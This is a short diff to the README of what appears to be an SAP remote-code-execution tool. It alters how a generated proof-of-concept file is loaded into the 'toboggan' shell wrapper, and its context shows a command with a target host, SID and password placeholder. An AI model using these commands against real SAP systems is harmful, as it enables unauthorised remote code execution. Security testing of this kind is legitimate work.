@@ -43,7 +43,7 @@ sapsxpg 'aw01585632.aws.sap-noprod.example.com' 'SAPTEST' 'P@ass!w0rd/7' --rce-p
 It will generate a file named `poc_aw01585632.aws.sap-noprod.example.com_ZSH.py`. Plug-it with `toboggan`:
 
 ```shell
-toboggan -m poc_aw01585632.aws.sap-noprod.example.com_ZSH.py
+toboggan poc_aw01585632.aws.sap-noprod.example.com_ZSH.py
 ```
 
 ## Disclaimer
